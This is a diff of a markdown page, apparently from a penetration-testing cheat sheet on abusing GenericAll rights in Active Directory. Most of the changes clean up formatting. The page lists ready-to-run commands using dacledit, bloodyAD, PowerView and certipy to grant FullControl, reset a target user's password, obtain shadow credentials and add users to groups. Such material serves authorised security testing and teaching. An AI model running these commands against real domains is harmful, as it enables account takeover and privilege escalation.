@@ -10,9 +10,7 @@ tags: ["GenericAll", "active driectory", "ad", "Windows", "shadow credentials"]
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 0. Install latest impacket (included dacledit.py) \[optional\]
-
-<div>
+#### 0. Install latest impacket (included dacledit.py)
 
 ```console
 git clone https://github.com/fortra/impacket.git
@@ -26,30 +24,20 @@ cd impacket
 pip3 install .
 ```
 
-</div>
-
 #### 1. Add Full Control to current user
-
-<div>
 
 ```console
 dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
 ```
 
-</div>
-
 #### 2. Change password
 
-{{< tab set2 tab1 active >}}BloodyAD{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
-
-<div>
+{{< tab set1-1 tab1 active >}}bloodyAD{{< /tab >}}
+{{< tabcontent set1-1 tab1 >}}
 
 ```console
 python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD>
 ```
-
-</div>
 
 <small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>
 
@@ -59,17 +47,11 @@ python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set pass
 
 #### 1. Import PowerView.ps1 
 
-<div>
-
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
 #### 2. Change target user password
-
-<div>
 
 ```console
 $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
@@ -79,11 +61,7 @@ $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
 Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -92,9 +70,7 @@ Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 {{< tab set3 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 0. Install latest impacket (included dacledit.py) \[optional\]
-
-<div>
+#### 0. Install latest impacket (included dacledit.py)
 
 ```console
 git clone https://github.com/fortra/impacket.git
@@ -108,31 +84,19 @@ cd impacket
 pip3 install .
 ```
 
-</div>
-
 #### 1. Add Full Control to current user
-
-<div>
 
 ```console
 dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl
 ```
 
-</div>
-
 #### 2. Get shadow credentials
-
-<div>
 
 ```console
 sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC>
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -141,22 +105,15 @@ sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USERNAME>@<DOMAIN> -pa
 {{< tab set4 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
-#### 1. Import PowerView.ps1 
-
-<div>
-
+#### 1. Import PowerView
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
-$username = "<DOMAIN>\<USER>"
+$username = '<DOMAIN>\<USER>'
 ```
 
 ```console
@@ -167,18 +124,10 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
 #### 2. Add user to group
-
-<div>
 
 ```console
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
